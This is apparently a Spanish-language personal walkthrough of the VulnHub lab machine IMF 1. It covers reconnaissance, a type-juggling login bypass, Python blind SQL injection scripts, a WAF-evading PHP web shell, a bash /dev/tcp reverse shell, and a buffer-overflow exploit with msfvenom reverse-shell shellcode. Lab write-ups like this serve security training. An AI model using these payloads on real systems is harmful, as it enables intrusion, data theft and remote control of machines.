
---
- Tags:  #vulhub #IMF1 
---

- **Máquina IMF 1**: [https://www.vulnhub.com/entry/imf-1,162/](https://www.vulnhub.com/entry/imf-1,162/)


# Primera máquina:
## Reconocimiento:

### Arp-scan
(Es decir, `arp-scan` busca **primero** en el directorio de trabajo actual, y solo si obtiene `ENOENT` (archivo no existe) hace _fallback_ a la ruta absoluta. El problema es que si obtiene `EACCES` (Permission denied) **no hace el fallback** y se queda con el warning.)

Escaneamos la tarjeta de red para ver cual es la ip de la máquina:
```bash 
arp-scan -I ens33 --localnet
```
### Ping
```
ping -c 1 192.168.1.146
```

*(si responde poderiamos usar la herramienta ''whichSystem.py'')*
### Nmap

Ejecutamos el comando como administrador.
Descubrimos los puertos abiertos.
```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.1.146 -oG allPorts
```

Una vez descubiertos los puertos, ejecutamos una serie de scripts sobre los puertos.
*(En este caso, solo estaba disponible el puerto 80)*
```bash
nmap -sC -sV -p80 192.168.1.146 -oN Targgeted
```

Con *ctrl + shift + t* abrimos otro espacio de trabajo mientras realizamos el scaneo. y con *ctrl + shift + alt + t* nombramos escaneo y reconocimiento, *ctrl + shift + w* para cerrar solo el espacio de trabajo actual.

```bash
nmap --script http-enum -p80 192.168.1.146 -oN webScan
```
Este script actua como un fuzzer
### Whatweb
Ejecutamos el comando whatweb para ver que esta empleando la máquina.
```bash
whatweb http://192.168.1.146 -v
```

Deberian salir versiones desactualizadas o propensas a ataques. Hay que documentarlo.

### Página web
Abrimos la página y vemos klk, gracias al nmap del puerto 80 tenemos la version de Apache y podemos sacar la de Ubuntu en este caso. Cuando ganemos acceso a la máquina, podemos hacer un: *lsb_release -a* para confirmar la versión de ubuntu.

Cojemos toda la información que encontremos, apuntando usuarios y email junto con otras informaciones de valor en un archivo data.

Miramos el codigo fuente. *ctrl + u* , encontramos algo que puede ser código en base 64 y para cogerlo desde la web hacemos: 
```bash
curl -s -X GET "http://192.168.1.146/index.php" | grep '\.js' | tail -n 3 | grep -oP '".*?"' | tr -d '"' | sed 's/js\///' | awk '{print $1}' FS="." | xargs | tr -d ' ' | base64 -d; echo
```
y asi conseguimos la primera flag, flag2 que acaba indicandonos un directorio.
"imfadministrator"
#### http://192.168.1.146/imfadministrator/
Una vez dentro de imfadministrator tenemos una via potencial de listado de usuarios validos, probando los nombres de usuario del apartado de contacto.

Probamos tecnicas de sql y demás para ver si vemos algo interesante.
Encontramos a base de probar el OWASP top 10 el type juggling con burpsuite

### Burpsuite y Type Juggling
Para abrir burpsuite idependiente de una terminal usamos el comando: 
```bash
burpsuite &> /dev/null & disown
```
es importante tambien activar el proxy en el navegador.

Le hacemos una petición de login a la web en el directorio que encontramos (/imfadministrator ) con uno de los usuarios que encontramos en */contact.php* y como contraseña cualquiera. 

Le mandamos la petición a burpsuite, y en el campo de pass le aplicamos un type juggling con un [], nos da acceso y si con *ctrl + shift + c* inspeccionamos la página web podemos ver la cookie de sesión válida.

### Inyección Boolean

Descubrimos que en la Url, si hacemos una comparación la respuesta de la página web cambia
```
	http://192.168.18.225/imfadministrator/cms.php?pagename=home'or'1'='1
```

Para descubrir el nombre de la base de datos actualmente en uso, en vez de igualar a uno como en el ejemplo anterior, podemos igualar caractéres. 
```
	http://192.168.18.225/imfadministrator/cms.php?pagename=home' or substring(database(),1,1)='a
```

En vez de database, podriamos jugar con tablas, columnas e incluso dumpear los valores de las tablas.

Nos ayudamos de burpsuite para coger la cookie de sessión y arrastrarla en nuestro script.
```
Cookie: PHPSESSID=4l6hvd5mc8dasoid8u7lcja4v6
```

### Script en pyton

Nos dirigimos al directorio de la máquina: *~/Escritorio/IMF* y creamos con nvim el *sqli.py*.
```python
#!/usr/bin/python3

from pwn import *
import requests, signal, sys, time, string

def def_handler(sig, frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)

# Ctrl+C 
signal.signal(signal.SIGINT, def_handler)

# Variables Globales
characters = string.ascii_lowercase + "_," + string.digits
main_url = "http://192.168.18.225/imfadministrator/cms.php?pagename="

def sqli():

    headers = {
        'Cookie': 'PHPSESSID=4l6hvd5mc8dasoid8u7lcja4v6'
    }

    data = ""

    p1 = log.progress("SQLI")
    p1.status("Iniciando ataque de inyeccion SQL")

    time.sleep(2)

    p2 = log.progress("Data")
    
    for position in range(1, 100):
        for character in characters:

            sqli_url = main_url + "home' or substring((select group_concat(schema_name) from information_schema.schemata),%d,1)='%s" % (position, character)

            r = requests.get(sqli_url, headers=headers)

            if "Welcome to the IMF Administration." not in r.text:

                data += character
                p2.status(data)
                break

    p1.success("Ataque de inyeccion SQL finalizado exitosamente")
    p2.success(data)

if __name__=='__main__':

    sqli()

```

Después de esto, hacemos unos pequeños cambios para enumerar las tablas y columnas encontramos en la tabla pagename la columna pages con */tutorials-incomplete*

```python
#!/usr/python3

from pwn import *
import requests, signal, sys, time, string

def def_handler(sig, frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)

# Ctrl+C 
signal.signal(signal.SIGINT, def_handler)

# Variables Globales
characters = string.ascii_lowercase + "_,-:" + string.digits
main_url = "http://192.168.18.225/imfadministrator/cms.php?pagename="

def sqli():

    headers = {
        'Cookie': 'PHPSESSID=4l6hvd5mc8dasoid8u7lcja4v6'
    }

    data = ""

    p1 = log.progress("SQLI")
    p1.status("Iniciando ataque de inyeccion SQL")

    time.sleep(2)

    p2 = log.progress("Data")
    
    for position in range(1, 100):
        for character in characters:

            sqli_url = main_url + "home' or substring((select group_concat(pagename) from pages),%d,1)='%s" % (position, character)

            r = requests.get(sqli_url, headers=headers)

            if "Welcome to the IMF Administration." not in r.text:

                data += character
                p2.status(data)
                break

    p1.success("Ataque de inyeccion SQL finalizado exitosamente")
    p2.success(data)

if __name__=='__main__':

    sqli()

```

En */tutorials-incomplete* encontramos un código QR, que con un QR online decoder y flameshot nos da la *flag4{dXBsb2Fkcjk0Mi5waHA=}*  que si resolvemos el base64 nos da *uploadr942.php*. Se trata se un recurso de subida de archivos que existe en */imfadministrator/uploadr942.php*, como la web permite subida de archivos php, probamos a crear un *cmd.php*.
```php
<?php
	system($_GET['cmd']);
 ?>
```

Sin embargo la página web nos devuelve un *"Invalid file type"*, probamos a cambiar los magic numbers añadiendo un GIF8; al inicio del script. Nada cambia asi que abrimos el burpsuite e inteceptamos la subida, cambiando el tipo de archivo de un cmd.php a un *image/jpg* por ejemplo. 
La extensión *.jpg* le gusta pero nos salta el CrappyWAF por la palabra *system* usada en el script. Para burlar el WAF lo que hacemos es igualar system a una variable como *$c* por ejemplo y luego con un *echo* lo aplicamos a nivel de sistema. Pero en este caso tambien podemos unicamente poner la palabra en hexadecimal.
```php
GIF8;
<?php
	# "system" in hex: 73 79 73 74 65 6d
	"\x73\x79\x73\x74\x65\x6d"($_GET['cmd']);
?>
```

Una vez subido el archivo, si vemos el código fuente de la página podemos ver un identificador debajo de *File successfully uploaded*. Con este identificador y añadiendo *.gif* en este caso podemos acceder a http://192.168.18.225/imfadministrator/uploads/0e2c068c0330.gif que es donde se estan subiendo los archivos y se interpreta nuestro código php.

### Reverse Shell
Como tenemos una forma potencial de ejecutar comandos, nos ponemos en escucha por el puerto 443 con netcat
```bash
nc -nlvp 443
```

Y en la url ponemos el one liner con url encode para el *&* y con nuestra ip
```shell
http://192.168.18.225/imfadministrator/uploads/0e2c068c0330.gif?cmd=bash -c "bash -i >%26 /dev/tcp/192.168.18.226/443 0>%261"
```

Una vez ganamos acceso aplicamos un tratamiento de la tty para que se vea bonito. (Cada linea es un comado separado)
```shell
script /dev/null -c bash
#ctrl+z
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
stty rows 44 columns 184
```

Una vez tenemos la todo funcionando, podemos hacer un *ls* y encontrar la flag5 *agentservices* 

### Escalada de privilegios

Como la flag5 era agentservices, buscamos desde la raiz archivos que contengan la palabra agent.
```bash
cd / 
find / -name agent 2>/dev/null
```

Encontramos un */etc/xinetd.d/agent* que es un servicion que esta corriendo en el puerto 7788, donde el propietario es root. Pero es un binario normal, no tiene SUID ni ninguna capability. Nos conectamos al puerto en segundo plano y podemos ver como el servicio se activa.
```bash
nc localhost 7788 &>/dev/null &
ps -faux | grep agent
```

Cuando nos conectamos nos pide el *Agent ID*, que no lo sabemos, pero si usamos strings para tratar de listar las cadenas de caracteres imprimibles de este binario encontremos algo.
```bash
strings /usr/local/bin/agent
```

### Buffer Overflow
Como de primeras no se ve nada, vamos a analizar el binario con **GHIDRA**, nos pasamos el binario de la máquina víctima a la atacante.
```bash
#maquina atacante
nc -nlvp 443 > agent
#maquina victima
nc 192.168.18.226 < /usr/local/bin/agent
```

Lo abrimos con ghidra y vamos a function y main. Alli debajo de Agent ID: podemos encontrar un *fgets* de *local 22*, que parece ser el input del usuario, asi que con *l* sustituimos local 22 por *userinput*. Un poco mas abajo podemos ver que el programa hace un *strncmp*(una comparación) del *userinput* y un *local28*. Con lo cual encontramos un poco mas arriba el *asprintf* de local28 que le esta cargando un número en hexadecimal (0x2ddd984) que si lo pasamos a decimal nos da **48093572** que es el Agent ID.

![[Pasted image 20260917132456.png]]

Con el cual podemos acceder al menú con 3 opciones, pero la interesante es la tercera, en la que con Ghidra podemos ver que la función report tiene un *char local_a8* con un tamaño de buffer de [164] y ademas utiliza un *gets(local_a8)* para cargarla, que es una función vulnerable donde si yo meto muchos mas caracteres que 164 se va a acontecer un buffer overflow.

Para el buffer overflow vamos a utilizar peda, asi que abrimos el gdb ejecutando el agent. 
```bash
gdb ./agent -q              
```

(si no funciona, puede ser porque el agent no tiene permisos, *chmod +x agent* o tambien porque el agent es un programa en 32bits y mi ordenador es de 64, asi que hay que instalar y actualizar algunas librerias.)
```bash
sudo pacman -Sy
sudo pacman -S lib32-glibc lib32-gcc-libs
```

Con el gdb y pasandole unas 200 "A" por ejemplo podemos ver que en el EIP se esta aconteciendo un buffer overflow. Así que vamos a tratar de calcular cual es el total de caracteres que tenemos que introducir hasta antes de sobrescribir el EIP. Dentro de gdb utilizamos los siguientes comandos. (Como PETA no estaba funcionando, me he descargado pwndbg).

```pwndbg
cyclic 200
r
```

Pegamos las 200 lineas en el 3_report update y luego para saber el tamaño del offset ejecutamos.
```pwndbg
cyclic -l $eip
```

Nos da un total de 168, asi que con el comando *checksec* revisamos las protecciones. Como el aslr esta deshabilitado, no podemos poner que le eip apunte a una dirección fija, porque esta cambiará en la próxima ejecución. Pero la direcciones contenidas en le binario, son estáticas.  Asi que buscamos cual es la dirección de eax para hacer un script en python.

Creamos la instrucción con *msfvenom*
```bash
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.18.226 LPORT=443 -b '\x00\x0a\0xd' -f c
```

Con lo que no crea, podemos hacer un script en python.
```python
#!/usr/bin/python3 
from struct import pack
import socket

shellcode = (b"\x33\xc9\x83\xe9\xef\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76"
b"\x0e\xb3\x21\x2a\x06\x83\xee\xfc\xe2\xf4\x82\xfa\xdd\xe5"
b"\xe0\x62\x79\x6c\xb1\xa8\xcb\xb6\xd5\xec\xaa\x95\xea\x91"
b"\x15\xcb\x33\x68\x53\xff\xdb\xe1\x82\x14\x51\x49\x28\x06"
b"\xb2\x9a\xa3\xe7\x03\x47\x7a\x57\xe0\x92\x29\x8f\x52\xec"
b"\xaa\x54\xdb\x4f\x05\x75\xdb\x49\x05\x29\xd1\x48\xa3\xe5"
b"\xe1\x72\xa3\xe7\x03\x2a\xe7\x86")

offset = 168
payload = shellcode + b"A" * (offset - len(shellcode)) + pack("<I", 0x08048563) + b"\n"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("127.0.0.1", 7788))
s.recv(1024)
s.send(b"48093572\n")
s.recv(1024)
s.send(b"3\n")
s.recv(1024)
s.send(payload)
```

Nos ponemos en escucha, con la máquina atacante, por el puerto especificado en el msfvenom y al ejecutar el script en la máquina víctima, si todo ha salido bien, deberiamos terner una shell en root. Para el tratamiento de la tty vale con un simple *script /dev/null -c bash* y accedemos al directorio de root para la última flag.
![[Pasted image 20260918142622.png]]